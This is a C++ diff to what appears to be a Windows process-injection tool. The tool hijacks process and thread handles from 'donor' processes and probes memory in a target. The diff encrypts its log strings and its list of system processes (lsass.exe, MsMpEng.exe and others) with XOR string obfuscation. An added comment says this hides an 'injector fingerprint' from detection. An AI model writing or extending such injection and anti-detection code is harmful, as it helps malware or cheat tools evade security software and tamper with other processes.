@@ -455,7 +455,7 @@ namespace
 				}
 			}
 
-			LOG(1, "ProbeVmOperation: Release Failed Three Times; Page Retained In Target\n");
+			LOG(1, XOR_STR_A("ProbeVmOperation: Release Failed Three Times; Page Retained In Target\n").get());
 
 			return true;
 	}
@@ -522,22 +522,25 @@ namespace
 			}
 			else
 			{
-				static const wchar_t * const kDefaultExcluded[] =
+				// The default exclusion list is a strong injector fingerprint (it names exactly the
+				// processes a handle donor must never come from), so the names are encrypted
+				// literals. std::wstring copies the decrypted text, so the entries stay valid.
+				static const std::wstring kDefaultExcluded[] =
 				{
-					L"lsass.exe",
-					L"csrss.exe",
-					L"winlogon.exe",
-					L"services.exe",
-					L"smss.exe",
-					L"SecurityHealthService.exe",
-					L"MsMpEng.exe",
-					L"dwm.exe",
-					L"conhost.exe",
-					L"fontdrvhost.exe",
-					L"spoolsv.exe",
-					L"wmiprvse.exe",
+					std::wstring(XOR_STR_W(L"lsass.exe").get()),
+					std::wstring(XOR_STR_W(L"csrss.exe").get()),
+					std::wstring(XOR_STR_W(L"winlogon.exe").get()),
+					std::wstring(XOR_STR_W(L"services.exe").get()),
+					std::wstring(XOR_STR_W(L"smss.exe").get()),
+					std::wstring(XOR_STR_W(L"SecurityHealthService.exe").get()),
+					std::wstring(XOR_STR_W(L"MsMpEng.exe").get()),
+					std::wstring(XOR_STR_W(L"dwm.exe").get()),
+					std::wstring(XOR_STR_W(L"conhost.exe").get()),
+					std::wstring(XOR_STR_W(L"fontdrvhost.exe").get()),
+					std::wstring(XOR_STR_W(L"spoolsv.exe").get()),
+					std::wstring(XOR_STR_W(L"wmiprvse.exe").get()),
 				};
-				for (const wchar_t * candidate : kDefaultExcluded)
+				for (const std::wstring & candidate : kDefaultExcluded)
 				{
 					m_Names.emplace_back(candidate);
 				}
@@ -972,9 +975,9 @@ namespace
 					Detail.Success = 1;
 					Detail.FailCode = INJ_ERR_SUCCESS;
 					Detail.SnapshotBytes = static_cast<DWORD>(Snapshot.Buffer.size() > 0xFFFFFFFF ? 0xFFFFFFFF : Snapshot.Buffer.size());
-					LOG(1, "[Handle] [+] Donor Handle Acquired: Donor PID = %u | Donor Handle = 0x%08X\n", FoundDonorPid, FoundDonorHandle);
-					LOG(1, "[Handle] [+] Duplicated Handle: Local = 0x%08X | Granted = 0x%08X\n", FoundNewHandle, FoundGranted);
-					LOG(1, "[Handle] [*] Census: Total = %u | Examined = %llu | DupDenied = %llu | VerifyRejected = %llu | Owners = %llu | BudgetSkipped = %llu | Blocklisted = %llu\n",
+					LOG(1, XOR_STR_A("[Handle] [+] Donor Handle Acquired: Donor PID = %u | Donor Handle = 0x%08X\n").get(), FoundDonorPid, FoundDonorHandle);
+					LOG(1, XOR_STR_A("[Handle] [+] Duplicated Handle: Local = 0x%08X | Granted = 0x%08X\n").get(), FoundNewHandle, FoundGranted);
+					LOG(1, XOR_STR_A("[Handle] [*] Census: Total = %u | Examined = %llu | DupDenied = %llu | VerifyRejected = %llu | Owners = %llu | BudgetSkipped = %llu | Blocklisted = %llu\n").get(),
 						Detail.TotalHandles, (unsigned long long)Examined, (unsigned long long)DupDenied, (unsigned long long)VerifyRejected, (unsigned long long)Owners.size(), (unsigned long long)BudgetSkipped, (unsigned long long)BlocklistedOwners);
 					return INJ_ERR_SUCCESS;
 				}
@@ -1094,7 +1097,7 @@ namespace
 
 		Local.Calibrated = HaveType ? 1 : 0;
 		Local.SnapshotBytes = static_cast<DWORD>(Snap.Buffer.size() > 0xFFFFFFFF ? 0xFFFFFFFF : Snap.Buffer.size());
-		LOG(1, "[Handle] [*] Handle Table Census: %llu Bytes | Calibrated = %d | Type = %u\n",
+		LOG(1, XOR_STR_A("[Handle] [*] Handle Table Census: %llu Bytes | Calibrated = %d | Type = %u\n").get(),
 			(unsigned long long)Snap.Buffer.size(), HaveType ? 1 : 0, (unsigned)WantedType);
 
 		const DWORD ScanRet = ScanSnapshot(Ntdll, Snap, SelfPid, TargetPid, TargetTid, ThreadScan, WantedType, HaveType, DesiredAccess, TargetOwnerHandle, Out, Local);
@@ -1143,14 +1146,14 @@ namespace
 	const DWORD ActualPid = ScGetProcessId(Candidate);
 	if (ActualPid != TargetPid)
 	{
-		LOG(1, "ValidateSponsor: PID Mismatch (Actual = %lu | Want = %lu)\n", ActualPid, TargetPid);
+		LOG(1, XOR_STR_A("ValidateSponsor: PID Mismatch (Actual = %lu | Want = %lu)\n").get(), ActualPid, TargetPid);
 		return false;
 	}
 
 	wchar_t Name[MAX_PATH * 2]{ 0 };
 	if (!ScGetProcessImageName(Candidate, Name, static_cast<DWORD>(sizeof(Name) / sizeof(Name[0]))))
 	{
-		LOG(1, "ValidateSponsor: Name Query Failed (PID = %lu)\n", TargetPid);
+		LOG(1, XOR_STR_A("ValidateSponsor: Name Query Failed (PID = %lu)\n").get(), TargetPid);
 		return false;
 	}
 
@@ -1170,7 +1173,7 @@ namespace
 		void * Page = ScAllocateMemory(Candidate, 0x1000, PAGE_READWRITE);
 		if (!Page)
 		{
-			LOG(1, "ProbeRoundtrip: Alloc Failed\n");
+			LOG(1, XOR_STR_A("ProbeRoundtrip: Alloc Failed\n").get());
 			return false;
 		}
 
@@ -1197,13 +1200,13 @@ namespace
 		}
 		if (!released)
 		{
-			LOG(1, "ProbeRoundtrip: Release Failed Twice\n");
+			LOG(1, XOR_STR_A("ProbeRoundtrip: Release Failed Twice\n").get());
 			return false;
 		}
 
 		if (!Ok)
 		{
-			LOG(1, "ProbeRoundtrip: Read/Write Mismatch\n");
+			LOG(1, XOR_STR_A("ProbeRoundtrip: Read/Write Mismatch\n").get());
 		}
 
 		return Ok;
@@ -1248,7 +1251,7 @@ DWORD HijackProcessHandle(DWORD TargetPid, DWORD DesiredAccess, HANDLE & OutHand
 	}
 	catch (...)
 	{
-		LOG(0, "HijackProcessHandle: Unhandled Exception\n");
+		LOG(0, XOR_STR_A("HijackProcessHandle: Unhandled Exception\n").get());
 		OutHandle = nullptr;
 		Result = INJ_ERR_OUT_OF_MEMORY_NEW;
 	}
@@ -1269,7 +1272,7 @@ DWORD HijackThreadHandle(DWORD TargetPid, DWORD TargetTid, DWORD DesiredAccess, 
 	}
 	catch (...)
 	{
-		LOG(0, "HijackThreadHandle: Unhandled Exception\n");
+		LOG(0, XOR_STR_A("HijackThreadHandle: Unhandled Exception\n").get());
 		OutHandle = nullptr;
 		Result = INJ_ERR_OUT_OF_MEMORY_NEW;
 	}
